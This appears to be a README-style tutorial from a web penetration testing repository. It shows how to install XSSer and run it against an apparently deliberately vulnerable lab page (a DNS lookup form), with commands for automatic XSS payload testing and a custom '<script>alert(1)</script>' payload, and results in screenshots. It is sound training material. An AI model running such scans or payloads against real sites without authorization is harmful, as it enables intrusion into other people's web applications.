<h1>$${\color{blue}xssser}\space {\color{blue}tool }$$</h1>

# xsser

Cross Site “Scripter” (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.

It contains several options to try to bypass certain filters, and various special techniques of code injection.

Installed size: ```23.98 MB```
How to install: ```sudo apt install xsser```



```
xsser --help
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/0cf1b74d-e084-4ed6-a104-9c5b8f183052)




![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/ce41acb9-a118-42e5-bc61-9055211104ae)


> it is vulnerable web

#### ​Pass the URL to XSSER. Replace “​HelloWorld​” with “​XSS”​, this is done so that XSSer will substitute payload in place of "XSS" string.

```
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/2b9af22c-a031-4597-b91c-b5e6be3cf0e7)



### Trying various XSS payloads by using XSSer's ```--auto``` option.

```
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/89c4b34b-e737-487c-8574-9100ef8b7d53)


#### ​Using custom XSS payload.

```
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/cea49d65-765a-4cbf-b698-d83fe4b94c54)


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/1092dc5a-61fe-44a6-bafe-572847cd81d7)


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/09f732a0-a7b2-4166-bcd4-305f15b37246)




















